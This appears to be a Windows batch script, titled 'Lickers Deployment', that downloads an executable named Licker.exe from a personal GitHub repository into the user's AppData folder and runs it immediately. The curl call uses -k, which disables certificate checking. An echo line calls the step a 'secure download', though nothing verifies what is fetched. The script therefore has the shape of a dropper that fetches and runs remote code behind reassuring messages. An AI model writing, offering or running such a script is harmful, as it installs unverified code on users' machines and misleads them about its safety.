@echo off
title Lickers Deployment
echo [SYSTEM] Initializing secure download...

:: Create directory if it doesn't exist
if not exist "%APPDATA%\LickersProject" mkdir "%APPDATA%\LickersProject"
set "EXE_PATH=%APPDATA%\LickersProject\Licker.exe"

:: -k ignores the SSL revocation check error you are seeing
:: -L follows redirects to get the actual file
curl -k -L -o "%EXE_PATH%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"

if exist "%EXE_PATH%" (
    echo [SUCCESS] Lickers is ready.
    start "" "%EXE_PATH%"
) else (
    echo [ERROR] Download failed. Please check your internet connection.
    pause
)
exit
